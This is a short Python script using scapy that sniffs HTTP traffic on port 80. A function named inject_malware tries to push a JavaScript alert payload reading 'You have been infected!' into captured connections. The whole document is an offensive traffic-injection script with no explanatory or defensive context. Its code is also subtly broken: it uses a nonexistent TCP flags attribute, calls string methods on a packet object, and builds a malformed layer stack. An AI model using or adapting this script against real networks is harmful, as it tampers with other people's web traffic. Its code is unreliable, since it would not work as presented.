import scapy.all as scapy


def inject_malware(packet):
    if (
        packet.haslayer(scapy.TCP)
        and packet[scapy.TCP].flags & scapy.TCP.FLAGS["ACK"]
    ):
        if "http" in packet[scapy.TCP].payload.lower():
            scapy.send(
                packet
                / scapy.IP(dst=packet[scapy.IP].src)
                / scapy.TCP(flags="ACK")
                / scapy.Raw(
                    load=(
                        '<script>alert("You have been'
                        ' infected!")</script>'
                    )
                )
            )


scapy.sniff(filter="port 80", prn=inject_malware)
